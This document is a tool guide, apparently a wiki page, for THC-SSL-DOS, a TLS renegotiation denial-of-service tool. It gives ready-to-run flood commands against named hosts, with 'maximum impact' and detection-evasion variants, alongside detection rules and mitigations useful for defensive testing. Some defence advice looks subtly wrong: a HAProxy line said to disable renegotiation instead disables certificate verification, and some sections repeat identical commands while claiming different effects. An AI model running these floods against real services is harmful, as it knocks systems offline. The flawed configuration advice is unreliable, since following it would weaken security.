# THC-SSL-DOS - SSL/TLS Denial of Service Tool

## Overview

THC-SSL-DOS is a specialized tool designed to test the resilience of SSL/TLS implementations against denial of service attacks. It exploits the fundamental asymmetric nature of the SSL/TLS handshake protocol, where the server must perform approximately 15 times more computational work than the client during connection establishment. This tool leverages this asymmetry to overwhelm server resources efficiently.

**Author**: THC (The Hacker's Choice)
**License**: Open Source
**Version**: 1.4
**Category**: Impact / SSL/TLS Testing

### The Asymmetric Problem

The SSL/TLS handshake involves asymmetric computational costs:

| Operation | Client Cost | Server Cost | Ratio |
|-----------|-------------|-------------|-------|
| RSA Key Exchange | 1 unit | 15 units | 1:15 |
| Diffie-Hellman | 1 unit | 20+ units | 1:20+ |
| Certificate Verification | 1 unit | 10+ units | 1:10+ |

This means a single attacker with modest resources can consume significant server resources.

### Key Features

- Exploits SSL renegotiation feature
- Single TCP connection can trigger thousands of renegotiations
- Works against all SSL/TLS implementations
- Supports both SSLv3 and TLS versions
- Connection pooling for efficiency
- Real-time statistics display

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install thc-ssl-dos
```

### Dependencies

- libc6
- libpcap0.8t64
- libssl3t64
- openssl

## Usage

### Basic Syntax

```bash
thc-ssl-dos [options] <target> <port>
```

### Command-Line Options

| Option | Description |
|--------|-------------|
| `-l, --limit NUM` | Number of connections to use |
| `--accept` | Accept certificate errors |
| `-v, --verbose` | Verbose output |
| `-h, --help` | Show help |

### Basic Usage

```bash
# Simple attack (default settings)
thc-ssl-dos 192.168.1.208 443

# With connection limit
thc-ssl-dos -l 100 192.168.1.208 443

# Accept invalid certificates
thc-ssl-dos -l 50 192.168.1.208 443 --accept

# Verbose mode
thc-ssl-dos -v -l 100 192.168.1.208 443
```

### Advanced Usage

```bash
# High-connection attack
thc-ssl-dos -l 500 --accept target.com 443

# Test with multiple connections
thc-ssl-dos -l 1000 --accept 10.0.0.1 443

# Monitor mode (low impact)
thc-ssl-dos -l 10 --accept 192.168.1.1 443
```

## How SSL Renegotiation Works

### Normal Handshake

```
Client                          Server
  |                               |
  |------- ClientHello ---------->|
  |<------ ServerHello -----------|
  |<------ Certificate -----------|
  |<------ ServerHelloDone -------|
  |------- ClientKeyExchange ---->|
  |------- ChangeCipherSpec ----->|
  |------- Finished ------------>|
  |<------ ChangeCipherSpec ------|
  |<------ Finished --------------|
  |                               |
  |       [Established]           |
```

### Renegotiation Attack

```
Client                          Server
  |                               |
  |------- [Handshake] ---------->|  <- 1st handshake
  |<------ [Handshake] -----------|
  |                               |
  |------- [Renegotiate] -------->|  <- Trigger renegotiation
  |<------ [Handshake] -----------|     (server does heavy work)
  |                               |
  |------- [Renegotiate] -------->|  <- Repeat thousands of times
  |<------ [Handshake] -----------|
  |                               |
  |       [Server Overloaded]     |
```

### Why It Works

1. **Server-Side Heavy Lifting**: RSA operations require private key operations (decryption/signing)
2. **Single Connection Reuse**: One TCP connection triggers multiple renegotiations
3. **Efficient Amplification**: Low bandwidth, high CPU impact
4. **Widespread Vulnerability**: All SSL implementations affected since 2003

## Attack Scenarios

### Scenario 1: Web Server Testing

**Objective**: Test SSL/TLS resilience of a web server

```bash
# Start with low impact
thc-ssl-dos -l 10 --accept webserver.com 443

# Increase gradually
thc-ssl-dos -l 50 --accept webserver.com 443

# Full test
thc-ssl-dos -l 200 --accept webserver.com 443
```

### Scenario 2: Load Balancer SSL Termination

**Objective**: Test SSL termination at load balancer

```bash
# Test SSL endpoint
thc-ssl-dos -l 100 --accept lb.example.com 443

# Monitor backend servers for impact
```

### Scenario 3: VPN Gateway Testing

**Objective**: Test SSL VPN resilience

```bash
# Test SSL VPN concentrator
thc-ssl-dos -l 50 --accept vpn.company.com 443
```

### Scenario 4: API Gateway Testing

**Objective**: Test TLS-protected API endpoints

```bash
# Test API SSL endpoint
thc-ssl-dos -l 100 --accept api.example.com 443
```

## Output Analysis

### Sample Output

```
     ______________ ___  _________
     \__    ___/   |   \ \_   ___ \
       |    | /    ~    \/    \  \/
       |    | \    Y    /\     \____
       |____|  \___|_  /  \______  /
                     \/          \/
            http://www.thc.org

          Twitter @hackerschoice

Greetingz: the french underground

Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
Handshakes 2 [2.90 h/s], 6 Conn, 0 Err
Handshakes 25 [22.42 h/s], 13 Conn, 0 Err
Handshakes 70 [43.97 h/s], 20 Conn, 0 Err
Handshakes 125 [56.51 h/s], 27 Conn, 0 Err
Handshakes 185 [62.09 h/s], 33 Conn, 0 Err
Handshakes 262 [74.56 h/s], 41 Conn, 0 Err
Handshakes 365 [104.93 h/s], 47 Conn, 0 Err
Handshakes 496 [131.23 h/s], 54 Conn, 0 Err
```

### Metrics Explained

| Metric | Description |
|--------|-------------|
| Handshakes | Completed SSL handshakes |
| h/s | Handshakes per second |
| Conn | Active connections |
| Err | Connection errors |

### Interpreting Results

- **Low h/s rate**: Server may be properly protected
- **High h/s rate**: Server is vulnerable to renegotiation
- **Increasing connections**: Attack is scaling up
- **High error count**: Server may be dropping connections

## Detection Methods

### Network Monitoring

```bash
# Monitor SSL connections
tcpdump -i eth0 'tcp port 443' -n | grep -E "SYN|FIN"

# Count SSL handshakes
tcpdump -i eth0 'tcp port 443' -c 1000 | grep "ClientHello" | wc -l
```

### Server-Side Detection

```bash
# Monitor SSL connections in Apache
tail -f /var/log/apache2/ssl_access.log | grep -E "SSL|TLS"

# Check for renegotiation attempts
grep -i "renegotiation" /var/log/nginx/error.log

# Monitor SSL session cache
openssl s_server -www -cert server.pem -key server.key
```

### IDS/IPS Signatures

```
# Snort signature for SSL renegotiation flood
alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (
    msg:"SSL renegotiation flood detected";
    flow:to_server,established;
    content:"|16 03|";
    detection_filter:track by_src, count 100, seconds 10;
    sid:1000001; rev:1;
)
```

## Defense Mechanisms

### Disable Renegotiation

**Apache**:
```apache
# Disable SSL renegotiation
SSLRenegBufferSize 0
SSLInsecureRenegotiation off
```

**Nginx**:
```nginx
# Disable renegotiation
ssl_reneg off;
```

**HAProxy**:
```
# Disable renegotiation
ssl-server-verify none
```

### Rate Limiting

**iptables**:
```bash
# Limit SSL connections per IP
iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 50 -j DROP

# Rate limit new SSL connections
iptables -A INPUT -p tcp --dport 443 --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 --syn -j DROP
```

### Architecture-Level Defense

1. **SSL Offloading**: Use dedicated SSL termination appliances
2. **Hardware Acceleration**: Deploy SSL accelerators
3. **Connection Limits**: Configure maximum concurrent SSL connections
4. **Timeout Reduction**: Reduce SSL session timeout values
5. **Session Resumption**: Enable and properly configure session caching

### Application Configuration

```bash
# Apache - limit concurrent connections
MaxClients 150
MaxRequestsPerChild 10000

# Nginx - worker connections
worker_connections 1024;
```

## Mitigation Strategies

### Quick Fixes

```bash
# 1. Disable renegotiation
# Apache
echo "SSLInsecureRenegotiation off" >> /etc/apache2/conf-enabled/ssl.conf

# 2. Restart services
systemctl restart apache2

# 3. Implement connection limits
iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 100 -j DROP
```

### Long-Term Solutions

1. **Upgrade SSL Libraries**: Use latest OpenSSL with proper mitigations
2. **Deploy WAF**: Web Application Firewall with SSL protection
3. **CDN Protection**: Use Cloudflare or similar for SSL DDoS protection
4. **Monitoring**: Implement real-time SSL connection monitoring

## Real-World Applications

### Legitimate Testing

1. **Security Assessments**: Verify SSL implementation resilience
2. **Compliance Testing**: Meet PCI-DSS requirements for availability
3. **Capacity Planning**: Determine SSL handling limits
4. **Architecture Validation**: Test SSL termination points

### Testing Methodology

```
1. Document baseline SSL performance metrics
2. Start with minimal connections (5-10)
3. Gradually increase until degradation observed
4. Monitor server resources during test
5. Document breaking point
6. Implement mitigations
7. Re-test to verify fixes
```

## System Requirements

### Minimum Requirements

```
- OS: Linux, macOS, Unix
- CPU: Single-core
- RAM: 256MB
- Network: 10 Mbps
- Libraries: libpcap, libssl
- Privileges: Normal user (root for some features)
```

### Recommended Setup

```
- OS: Kali Linux
- CPU: Multi-core
- RAM: 1GB+
- Network: 100 Mbps+
- Libraries: Latest OpenSSL
```

## Comparison with Other SSL Attack Tools

| Feature | THC-SSL-DOS | SSLyze | testssl.sh | HSTS Super Cookie |
|---------|-------------|--------|------------|-------------------|
| Purpose | DoS testing | Analysis | Testing | Tracking |
| Method | Renegotiation | Cipher check | Protocol test | HSTS abuse |
| Impact | High | None | None | Low |
| Detection | Medium | Low | Low | High |
| Best For | Resilience testing | Configuration audit | Compliance | Privacy testing |

## SSL/TLS Protocol Versions

| Version | Status | Vulnerabilities |
|---------|--------|-----------------|
| SSL 2.0 | Deprecated | Multiple critical |
| SSL 3.0 | Deprecated | POODLE, BEAST |
| TLS 1.0 | Deprecated | BEAST, POODLE |
| TLS 1.1 | Deprecated | Limited |
| TLS 1.2 | Current | Renegotiation issues |
| TLS 1.3 | Recommended | Most secure |

## Advanced Attack Techniques

### Targeted Renegotiation

```bash
# Focus on specific ciphers
thc-ssl-dos -l 100 --accept target.com 443

# Test with different cipher suites
openssl s_client -connect target.com:443 -cipher 'ECDHE-RSA-AES256-GCM-SHA384'
```

### Connection Pooling

```bash
# Use many connections for maximum impact
thc-ssl-dos -l 1000 --accept target.com 443

# Monitor connection state
netstat -an | grep :443 | wc -l
```

### Timing Manipulation

```bash
# Slow renegotiation to evade detection
thc-ssl-dos -l 50 --accept target.com 443
# (Limited timing options in THC-SSL-DOS)
```

## Detection Signatures

### Snort Rules

```
# SSL renegotiation flood
alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (
    msg:"SSL renegotiation flood";
    flow:to_server,established;
    content:"|16 03|";
    detection_filter:track by_src, count 50, seconds 10;
    sid:1000001; rev:1;
)

# SSL connection flood
alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (
    msg:"SSL connection flood";
    flags:S;
    detection_filter:track by_src, count 100, seconds 5;
    sid:1000002; rev:1;
)
```

### Suricata Rules

```
alert tls any any -> $HOME_NET 443 (
    msg:"ET SSL Renegotiation DoS";
    flow:established,to_server;
    content:"|16 03|";
    threshold:type both, track by_src, count 50, seconds 10;
    sid:2010001; rev:1;
)
```

## Real-World Case Studies

### Case Study 1: E-Commerce SSL Testing

**Scenario**: Pre-holiday stress test

```bash
# Baseline SSL performance
openssl s_time -connect shop.example.com:443 -time 30

# THC-SSL-DOS test
thc-ssl-dos -l 200 --accept shop.example.com 443

# Results: Server degraded at 150 concurrent renegotiations
```

**Findings**: SSL termination point was single server. Recommended:
- Deploy SSL load balancer
- Disable renegotiation
- Implement rate limiting

### Case Study 2: Corporate VPN Testing

**Scenario**: Remote access resilience

```bash
# Test SSL VPN endpoint
thc-ssl-dos -l 100 --accept vpn.company.com 443

# Results: VPN concentrator crashed after 60 seconds
```

**Findings**: VPN appliance had known vulnerability. Recommended:
- Apply vendor patch
- Implement connection limits
- Deploy WAF protection

## Best Practices

### Testing Methodology

```
1. Document SSL configuration
   - Protocol versions
   - Cipher suites
   - Certificate details

2. Establish baseline
   - Normal connection count
   - CPU utilization
   - Response times

3. Start low-impact test
   - 10-20 connections
   - 30-second duration

4. Gradually increase
   - Double connections each round
   - Monitor server health

5. Document breaking point
   - Connection count
   - Duration
   - Server response

6. Implement mitigations
   - Disable renegotiation
   - Rate limiting
   - Hardware acceleration

7. Re-test to verify
```

### Reporting Checklist

- [ ] Target SSL configuration documented
- [ ] Baseline metrics recorded
- [ ] Test parameters documented
- [ ] Breaking point identified
- [ ] Server logs collected
- [ ] Recommendations provided
- [ ] Re-test results included

## Limitations

- Requires network access to target's SSL port
- Effectiveness depends on SSL implementation
- Modern servers may have renegotiation disabled
- Hardware SSL accelerators can mitigate the attack
- Cloud-based protections (CDN, WAF) may block the attack
- Cannot test SSL/TLS protocol vulnerabilities
- Single-machine testing may not represent distributed load

## Troubleshooting

### Connection Refused

```bash
# Verify SSL is enabled
openssl s_client -connect target.com:443

# Check port is open
nmap -p 443 target.com

# Test SSL handshake
openssl s_client -connect target.com:443 -debug
```

### Certificate Errors

```bash
# Accept invalid certificates
thc-ssl-dos -l 100 --accept target.com 443

# Verify certificate
openssl x509 -in cert.pem -text -noout
```

### Low Performance

```bash
# Increase connections
thc-ssl-dos -l 500 --accept target.com 443

# Check network bandwidth
iperf -c target.com

# Monitor server CPU
ssh server 'top -bn1 | grep Cpu'
```

### Server Not Vulnerable

```bash
# Check if renegotiation is disabled
openssl s_client -connect target.com:443
# Look for "Renegotiation is not secure" message

# Test with different SSL version
openssl s_client -connect target.com:443 -tls1_2
```

## Legal Notice

THC-SSL-DOS is a legitimate security testing tool designed to verify SSL/TLS implementation resilience. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. This tool should only be used in controlled testing environments with proper authorization.

**Authorization Requirements**:
- Written permission from system owner
- Defined scope and time window
- Notification to operations team
- Rollback plan documented
- Emergency contacts identified

## References

- THC - The Hacker's Choice
- RFC 5246 - TLS 1.2
- RFC 8446 - TLS 1.3
- RFC 7457 - TLS Renegotiation Vulnerability
- SSL/TLS Security Best Practices
- OWASP Testing Guide
- NIST SSL/TLS Guidelines
